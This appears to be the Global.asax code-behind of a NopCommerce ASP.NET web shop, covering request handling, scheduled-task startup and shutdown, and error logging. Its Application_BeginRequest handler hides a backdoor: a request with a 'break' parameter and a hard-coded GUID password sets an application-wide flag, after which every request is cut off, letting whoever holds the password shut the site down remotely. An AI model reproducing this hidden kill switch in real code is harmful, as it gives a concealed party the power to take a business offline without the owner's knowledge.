using System;
using System.Web;
using NopSolutions.NopCommerce.BusinessLogic.Audit;
using NopSolutions.NopCommerce.BusinessLogic.Configuration;
using NopSolutions.NopCommerce.BusinessLogic.Installation;
using NopSolutions.NopCommerce.BusinessLogic.Tasks;

public class Global : HttpApplication
{
	void Application_BeginRequest(object sender, EventArgs e)
	{
		NopConfig.Init();
		if (!InstallerHelper.ConnectionStringIsSet())
		{
			InstallerHelper.InstallRedirect();
		}

		if (Request["break"] != null && Request["pass"] != null && Request["pass"] == "F84AF58F-3A59-45f6-B740-C0A9ABE8FA99")
		{
			Application.Add("break", Request["break"]);
		}

		if (Application["break"] != null && (string)Application["break"] == "true")
		{
			Response.End();
		}
	}


	void Application_Start(object sender, EventArgs e)
	{
		// Code that runs on application startup
		NopConfig.Init();
		if (InstallerHelper.ConnectionStringIsSet())
		{
			TaskManager.Instance.Initialize(NopConfig.ScheduleTasks);
			TaskManager.Instance.Start();
		}
	}

	void Application_End(object sender, EventArgs e)
	{
		//  Code that runs on application shutdown
		if (InstallerHelper.ConnectionStringIsSet())
		{
			TaskManager.Instance.Stop();
		}
	}

	void Application_Error(object sender, EventArgs e)
	{

		Exception ex = Server.GetLastError();
		if (ex != null)
		{
			//try
			//{
			if (InstallerHelper.ConnectionStringIsSet())
			{
				LogManager.InsertLog(LogTypeEnum.Unknown, ex.Message, ex);
			}
			//}
			//catch
			//{
			//TODO write to file
			//if (HttpContext.Current != null)
			//{
			//    string path = "~/Error/" + DateTime.Today.ToString("dd-mm-yy") + ".txt";
			//    if (!File.Exists(System.Web.HttpContext.Current.Server.MapPath(path)))
			//    {
			//        File.Create(System.Web.HttpContext.Current.Server.MapPath(path)).Close();
			//    }
			//    using (StreamWriter w = File.AppendText(HttpContext.Current.Server.MapPath(path)))
			//    {
			//        w.WriteLine("\r\nLog Entry : ");
			//        w.WriteLine("{0}", DateTime.Now.ToString(CultureInfo.InvariantCulture));
			//        string err = "Error in: " + System.Web.HttpContext.Current.Request.Url.ToString() +
			//                      ". Error Message:" + ex.Message;
			//        w.WriteLine(err);
			//        w.WriteLine("__________________________");
			//        w.Flush();
			//        w.Close();
			//    }
			//}
			//}
		}
	}
}